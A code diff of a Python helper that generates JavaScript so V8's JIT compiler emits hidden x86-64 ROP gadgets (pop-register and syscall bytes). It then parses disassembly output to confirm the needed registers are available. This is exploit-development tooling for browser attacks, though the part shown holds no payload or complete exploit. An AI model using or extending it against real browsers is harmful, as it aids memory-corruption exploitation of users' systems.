@@ -11,7 +11,8 @@ gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
 # 48 8d 5f c3             lea    rbx,[rdi-0x3d]
 rs_set = {('rbx', 'rdx'), ('rbx', 'rsi'), ('rbx', 'rax'), ('rbx', 'rdi')}
 exec_path = ''
-count = 48
+count = 12
+
 
 def get_registers(log:str):
     f = open(log, 'r')
@@ -24,9 +25,12 @@ def get_registers(log:str):
     mm = dict()
     for line in lines:
         for num in nums:
-            if line.rfind(num) != -1 and line[line.rfind(num) - 1] == '+' and line.find('leal') != -1:
-                # print(line)
-                mm[(line[line.find('r') : line.find(',')], line[line.find(',') + 2: line.find('+')])] = num[2:]
+            if line.rfind(num) != -1 and line.find(',') != -1:
+                if line.find('leal') != -1:
+                    mm[line[line.rfind('r'):line.rfind('+')]] ='var' + str(int(num[2:]) - base)
+                    mm[line[line.find('r'):line.find(',')]] = 't' + str(int(num[2:]) - base)
+                else:
+                    mm[line[line.rfind('r'):line.rfind(',')]] = 'var' + str(int(num[2:]) - base)
                 break
     return mm
 
@@ -48,8 +52,9 @@ def excute_js(js:str, filename:str)->bool:
     
     return False
 
-def generate_template(count:int, indent:int):
+def generate_template(count:int):
     header = '''
+var array = new Uint8Array();
 function jsc('''
 
     for i in range(count - 1):
@@ -59,18 +64,15 @@ function jsc('''
     middle1 = ''
     idx = 0
     for i in range(count):
-        for j in range(indent):
-            var = 't' + str(idx)
-            middle1 += '\tvar ' + var + ' = var' + str(i) + ' + 0x' + str(base) + ';\n'
-            base += 1
-            idx += 1
-    
-
+        var = 't' + str(idx)
+        middle1 += '\tvar ' + var + ' = var' + str(i) + ' + 0x' + str(base) + ';\n'
+        base += 1
+        idx += 1
 
     middle2 = '\treturn '
-    ops = ['&', '|', '^']
+    ops = ['&', '^', '|']
     for i in range(idx - 1):
-        middle2 += 't' + str(i) + ' ' + ops[i % len(ops)] + ' '
+        middle2 += 't' + str(i) + ' ' + '& '
     middle2 += 't' + str(idx-1) + ';\n}\n'
 
     tail = '''
@@ -120,7 +122,7 @@ def generate_js(filename:str):
     i = 0
     while i < len(lines):
         if lines[i].find('\tvar s') == -1:
-            header += lines[i]
+            header += lines[i] 
         else:
             i += 2
             break
@@ -154,27 +156,13 @@ if __name__ == "__main__":
         print('path of v8 error')
         exit()
 
-    count = 1
-    val = 0
-    # while count < 24:
-    #     for j in range(1, count + 1):
-    #         generate_template(count, j)
-    #         rs_map = get_registers('test.txt')
-    #         if len(rs_map) > val:
-    #             val = len(rs_map)
-    #             print(len(rs_map))
-    #             print(count, j)
-    #             print(rs_map.keys() & rs_set)
-    #             print(rs_map)
-    #     count += 1
-    
-    generate_template(9, 6)
+    count = 12
+    generate_template(count)
     rs_map = get_registers('test.txt')
-
+    
+    print(rs_map)
     if not rs_set < set(rs_map.keys()):
         print('needed ', rs_set)
-        print('has', set(rs_map.keys()) & rs_set)
+        print('has', set(rs_map.keys()))
         print('resgister are not enough')
         exit()
-    # generate_js('test.js')
-    # print('done')
